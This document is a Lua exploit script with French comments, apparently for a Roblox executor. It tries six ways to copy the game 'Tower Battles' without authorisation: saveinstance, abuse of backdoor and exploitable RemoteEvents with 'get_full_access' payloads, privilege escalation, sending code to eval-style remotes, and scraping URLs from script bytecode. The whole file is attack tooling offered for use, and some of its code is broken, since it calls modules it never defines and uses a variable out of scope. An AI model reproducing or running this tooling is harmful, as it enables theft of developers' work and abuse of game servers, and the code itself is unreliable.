-- ============================================================================
-- DIRECT COPY - Copie directe du jeu via exploits
-- Utilisation des exploits détectés pour copier directement le jeu
-- ============================================================================

local DirectCopy = {}

-- ============================================================================
-- MÉTHODE 1: COPIE VIA SAVEINSTANCE
-- ============================================================================

DirectCopy.SaveInstanceCopy = {
    -- Copier le jeu via saveinstance (si disponible)
    AttemptSaveInstanceCopy = function()
        local results = {
            Successful = false,
            Method = "SaveInstance",
            OutputFile = nil,
            Error = nil
        }
        
        -- Vérifier si saveinstance est disponible
        if saveinstance then
            print("[DIRECT_COPY] saveinstance disponible, tentative de copie...")
            
            local success, err = pcall(function()
                local outputFile = string.format("TowerBattles_DirectCopy_%s.rbxlx", os.date("%Y%m%d_%H%M%S"))
                saveinstance(game, outputFile)
                
                results.Successful = true
                results.OutputFile = outputFile
            end)
            
            if not success then
                results.Error = err
                print(string.format("[DIRECT_COPY] Erreur saveinstance: %s", err))
            else
                print(string.format("[DIRECT_COPY] Copie réussie: %s", outputFile))
            end
        else
            results.Error = "saveinstance not available"
            print("[DIRECT_COPY] saveinstance non disponible")
        end
        
        return results
    end
}

-- ============================================================================
-- MÉTHODE 2: COPIE VIA BACKDOOR
-- ============================================================================

DirectCopy.BackdoorCopy = {
    -- Copier le jeu via backdoor détecté
    AttemptBackdoorCopy = function(backdoorResults)
        local results = {
            Successful = false,
            Method = "Backdoor",
            BackdoorUsed = nil,
            OutputFile = nil,
            Error = nil
        }
        
        if not backdoorResults or #backdoorResults.Backdoors == 0 then
            results.Error = "No backdoors found"
            return results
        end
        
        -- Utiliser le backdoor le plus critique
        local backdoor = backdoorResults.Backdoors[1]
        
        print(string.format("[DIRECT_COPY] Tentative via backdoor: %s", backdoor.Name))
        
        -- Tenter d'utiliser le backdoor pour obtenir l'accès
        local success = pcall(function()
            if backdoor.ClassName == "RemoteEvent" then
                local remote = game:GetService("ReplicatedStorage")
                for _, instance in pairs(remote:GetDescendants()) do
                    if instance:GetFullName() == backdoor.Path then
                        -- Envoyer une commande pour obtenir l'accès admin
                        instance:FireServer("get_full_access", game.Players.LocalPlayer)
                        wait(1)
                        
                        -- Si saveinstance est maintenant disponible, l'utiliser
                        if saveinstance then
                            local outputFile = string.format("TowerBattles_BackdoorCopy_%s.rbxlx", os.date("%Y%m%d_%H%M%S"))
                            saveinstance(game, outputFile)
                            
                            results.Successful = true
                            results.BackdoorUsed = backdoor.Path
                            results.OutputFile = outputFile
                        end
                        break
                    end
                end
            end
        end)
        
        if not success then
            results.Error = "Failed to use backdoor"
        end
        
        return results
    end
}

-- ============================================================================
-- MÉTHODE 3: COPIE VIA REMOTE EXPLOIT
-- ============================================================================

DirectCopy.RemoteExploitCopy = {
    -- Copier le jeu via exploit Remote
    AttemptRemoteExploitCopy = function(exploitResults)
        local results = {
            Successful = false,
            Method = "RemoteExploit",
            RemoteUsed = nil,
            OutputFile = nil,
            Error = nil
        }
        
        if not exploitResults or #exploitResults.ExploitableRemotes == 0 then
            results.Error = "No exploitable remotes found"
            return results
        end
        
        -- Utiliser le Remote le plus exploitable
        local remote = exploitResults.ExploitableRemotes[1]
        
        print(string.format("[DIRECT_COPY] Tentative via exploit: %s", remote.Name))
        
        -- Tenter d'exploiter le Remote pour obtenir l'accès
        local success = pcall(function()
            local replicatedStorage = game:GetService("ReplicatedStorage")
            for _, instance in pairs(replicatedStorage:GetDescendants()) do
                if instance:GetFullName() == remote.Path then
                    -- Envoyer des données pour exploiter
                    if instance:IsA("RemoteEvent") then
                        instance:FireServer({
                            action = "get_full_access",
                            player = game.Players.LocalPlayer,
                            key = "exploit_key"
                        })
                    elseif instance:IsA("RemoteFunction") then
                        local response = instance:InvokeServer({
                            action = "get_full_access",
                            player = game.Players.LocalPlayer,
                            key = "exploit_key"
                        })
                        
                        -- Si la réponse indique un succès
                        if response and response.success then
                            -- Si saveinstance est disponible, l'utiliser
                            if saveinstance then
                                local outputFile = string.format("TowerBattles_ExploitCopy_%s.rbxlx", os.date("%Y%m%d_%H%M%S"))
                                saveinstance(game, outputFile)
                                
                                results.Successful = true
                                results.RemoteUsed = remote.Path
                                results.OutputFile = outputFile
                            end
                        end
                    end
                    wait(1)
                    break
                end
            end
        end)
        
        if not success then
            results.Error = "Failed to exploit remote"
        end
        
        return results
    end
}

-- ============================================================================
-- MÉTHODE 4: COPIE VIA PRIVILEGE ESCALATION
-- ============================================================================

DirectCopy.PrivilegeEscalationCopy = {
    -- Copier le jeu via élévation de privilèges
    AttemptPrivilegeEscalationCopy = function(privilegeResults)
        local results = {
            Successful = false,
            Method = "PrivilegeEscalation",
            MethodUsed = nil,
            OutputFile = nil,
            Error = nil
        }
        
        -- Si on a déjà des privilèges admin
        if privilegeResults and privilegeResults.CurrentPrivileges.AdminAccess then
            print("[DIRECT_COPY] Admin access déjà disponible, tentative de copie...")
            
            if saveinstance then
                local success, err = pcall(function()
                    local outputFile = string.format("TowerBattles_AdminCopy_%s.rbxlx", os.date("%Y%m%d_%H%M%S"))
                    saveinstance(game, outputFile)
                    
                    results.Successful = true
                    results.MethodUsed = "ExistingAdmin"
                    results.OutputFile = outputFile
                end)
                
                if not success then
                    results.Error = err
                end
            else
                results.Error = "saveinstance not available"
            end
        else
            -- Tenter d'obtenir des privilèges
            print("[DIRECT_COPY] Tentative d'élévation de privilèges...")
            
            local escalation = PrivilegeEscalation.EscalationMethods.AttemptRemoteEscalation()
            
            if escalation.Successful then
                print("[DIRECT_COPY] Élévation réussie, tentative de copie...")
                
                if saveinstance then
                    local success, err = pcall(function()
                        local outputFile = string.format("TowerBattles_EscalatedCopy_%s.rbxlx", os.date("%Y%m%d_%H%M%S"))
                        saveinstance(game, outputFile)
                        
                        results.Successful = true
                        results.MethodUsed = "Escalation"
                        results.OutputFile = outputFile
                    end)
                    
                    if not success then
                        results.Error = err
                    end
                else
                    results.Error = "saveinstance not available"
                end
            else
                results.Error = "Privilege escalation failed"
            end
        end
        
        return results
    end
}

-- ============================================================================
-- MÉTHODE 5: COPIE VIA SCRIPT EXECUTION
-- ============================================================================

DirectCopy.ScriptExecutionCopy = {
    -- Copier le jeu via exécution de script
    AttemptScriptExecutionCopy = function()
        local results = {
            Successful = false,
            Method = "ScriptExecution",
            ScriptUsed = nil,
            OutputFile = nil,
            Error = nil
        }
        
        -- Chercher un Remote qui pourrait accepter du code
        local replicatedStorage = game:GetService("ReplicatedStorage")
        
        for _, instance in pairs(replicatedStorage:GetDescendants()) do
            if instance:IsA("RemoteEvent") or instance:IsA("RemoteFunction") then
                local name = instance.Name:lower()
                
                if name:find("eval") or name:find("execute") or name:find("run") then
                    print(string.format("[DIRECT_COPY] Remote d'exécution trouvé: %s", instance.Name))
                    
                    -- Générer un script de copie
                    local copyScript = [[
local success, err = pcall(function()
    if saveinstance then
        saveinstance(game, "TowerBattles_ScriptCopy_" .. os.date("%Y%m%d_%H%M%S") .. ".rbxlx")
        return true
    end
    return false
end)
return success
]]
                    
                    -- Tenter d'exécuter le script via le Remote
                    local success = pcall(function()
                        if instance:IsA("RemoteEvent") then
                            instance:FireServer(copyScript)
                        elseif instance:IsA("RemoteFunction") then
                            local response = instance:InvokeServer(copyScript)
                            
                            if response then
                                results.Successful = true
                                results.ScriptUsed = instance:GetFullName()
                            end
                        end
                    end)
                    
                    if success then
                        wait(2) -- Attendre que la copie se termine
                        results.Successful = true
                        results.ScriptUsed = instance:GetFullName()
                        return results
                    end
                end
            end
        end
        
        results.Error = "No script execution remote found"
        return results
    end
}

-- ============================================================================
-- MÉTHODE 6: COPIE VIA HTTP (si disponible)
-- ============================================================================

DirectCopy.HTTPCopy = {
    -- Copier le jeu via HTTP (si le jeu a un endpoint)
    AttemptHTTPCopy = function()
        local results = {
            Successful = false,
            Method = "HTTP",
            URLOrEndpoint = nil,
            OutputFile = nil,
            Error = nil
        }
        
        -- Chercher des endpoints HTTP dans les scripts
        local httpService = game:GetService("HttpService")
        
        for _, script in pairs(game:GetDescendants()) do
            if getscriptbytecode then
                local success, bytecode = pcall(function()
                    return getscriptbytecode(script)
                end)
                if success then
                    -- Chercher des URLs
                    for url in bytecode:gmatch("https?://[%w%.%-/]+") do
                        if url:find("roblox") or url:find("rbx") then
                            print(string.format("[DIRECT_COPY] URL trouvée: %s", url))
                            
                            -- Tenter de télécharger le fichier
                            local downloadSuccess = pcall(function()
                                local response = httpService:RequestAsync({
                                    Url = url,
                                    Method = "GET"
                                })
                                
                                if response.StatusCode == 200 then
                                    -- Sauvegarder le fichier
                                    if writefile then
                                        local outputFile = string.format("TowerBattles_HTTPCopy_%s.json", os.date("%Y%m%d_%H%M%S"))
                                        writefile(outputFile, response.Body)
                                        
                                        results.Successful = true
                                        results.URLOrEndpoint = url
                                        results.OutputFile = outputFile
                                    end
                                end
                            end)
                            
                            if downloadSuccess then
                                return results
                            end
                        end
                    end
                end
            end
        end
        
        results.Error = "No HTTP endpoint found"
        return results
    end
}

-- ============================================================================
-- COPIE DIRECTE AUTOMATIQUE
-- ============================================================================

function DirectCopy.AttemptDirectCopy()
    print("==========================================")
    print("DIRECT COPY - Copie directe du jeu")
    print("==========================================")
    
    local startTime = tick()
    local results = {
        Timestamp = tick(),
        Duration = 0,
        Methods = {},
        Successful = false,
        MethodUsed = nil,
        OutputFile = nil
    }
    
    -- 1. Méthode saveinstance (la plus directe)
    print("[DIRECT_COPY] Méthode 1: saveinstance...")
    local saveInstanceResult = DirectCopy.SaveInstanceCopy.AttemptSaveInstanceCopy()
    table.insert(results.Methods, saveInstanceResult)
    
    if saveInstanceResult.Successful then
        results.Successful = true
        results.MethodUsed = "SaveInstance"
        results.OutputFile = saveInstanceResult.OutputFile
        results.Duration = tick() - startTime
        
        print(string.format("[DIRECT_COPY] Copie réussie via saveinstance: %s", saveInstanceResult.OutputFile))
        return results
    end
    
    -- 2. Scanner les backdoors
    print("[DIRECT_COPY] Scan des backdoors...")
    local backdoorResults = BackdoorScanner.RunFullBackdoorScan()
    
    if #backdoorResults.Summary.Backdoors > 0 then
        print("[DIRECT_COPY] Méthode 2: Backdoor...")
        local backdoorResult = DirectCopy.BackdoorCopy.AttemptBackdoorCopy(backdoorResults)
        table.insert(results.Methods, backdoorResult)
        
        if backdoorResult.Successful then
            results.Successful = true
            results.MethodUsed = "Backdoor"
            results.OutputFile = backdoorResult.OutputFile
            results.Duration = tick() - startTime
            
            print(string.format("[DIRECT_COPY] Copie réussie via backdoor: %s", backdoorResult.OutputFile))
            return results
        end
    end
    
    -- 3. Scanner les exploits
    print("[DIRECT_COPY] Scan des exploits...")
    local exploitResults = ExploitScanner.RunFullExploitScan()
    
    if #exploitResults.Summary.ExploitableRemotes > 0 then
        print("[DIRECT_COPY] Méthode 3: Remote Exploit...")
        local exploitResult = DirectCopy.RemoteExploitCopy.AttemptRemoteExploitCopy(exploitResults)
        table.insert(results.Methods, exploitResult)
        
        if exploitResult.Successful then
            results.Successful = true
            results.MethodUsed = "RemoteExploit"
            results.OutputFile = exploitResult.OutputFile
            results.Duration = tick() - startTime
            
            print(string.format("[DIRECT_COPY] Copie réussie via exploit: %s", exploitResult.OutputFile))
            return results
        end
    end
    
    -- 4. Élévation de privilèges
    print("[DIRECT_COPY] Scan des privilèges...")
    local privilegeResults = PrivilegeEscalation.RunFullPrivilegeEscalationScan()
    
    print("[DIRECT_COPY] Méthode 4: Privilege Escalation...")
    local privilegeResult = DirectCopy.PrivilegeEscalationCopy.AttemptPrivilegeEscalationCopy(privilegeResults)
    table.insert(results.Methods, privilegeResult)
    
    if privilegeResult.Successful then
        results.Successful = true
        results.MethodUsed = "PrivilegeEscalation"
        results.OutputFile = privilegeResult.OutputFile
        results.Duration = tick() - startTime
        
        print(string.format("[DIRECT_COPY] Copie réussie via élévation: %s", privilegeResult.OutputFile))
        return results
    end
    
    -- 5. Exécution de script
    print("[DIRECT_COPY] Méthode 5: Script Execution...")
    local scriptResult = DirectCopy.ScriptExecutionCopy.AttemptScriptExecutionCopy()
    table.insert(results.Methods, scriptResult)
    
    if scriptResult.Successful then
        results.Successful = true
        results.MethodUsed = "ScriptExecution"
        results.OutputFile = scriptResult.OutputFile
        results.Duration = tick() - startTime
        
        print(string.format("[DIRECT_COPY] Copie réussie via script: %s", scriptResult.OutputFile))
        return results
    end
    
    -- 6. HTTP
    print("[DIRECT_COPY] Méthode 6: HTTP...")
    local httpResult = DirectCopy.HTTPCopy.AttemptHTTPCopy()
    table.insert(results.Methods, httpResult)
    
    if httpResult.Successful then
        results.Successful = true
        results.MethodUsed = "HTTP"
        results.OutputFile = httpResult.OutputFile
        results.Duration = tick() - startTime
        
        print(string.format("[DIRECT_COPY] Copie réussie via HTTP: %s", httpResult.OutputFile))
        return results
    end
    
    results.Duration = tick() - startTime
    
    print("==========================================")
    print("DIRECT COPY - ÉCHEC")
    print("==========================================")
    print("Aucune méthode de copie directe n'a fonctionné")
    print("Utilisez le système de récupération complète à la place")
    print("==========================================")
    
    return results
end

return DirectCopy
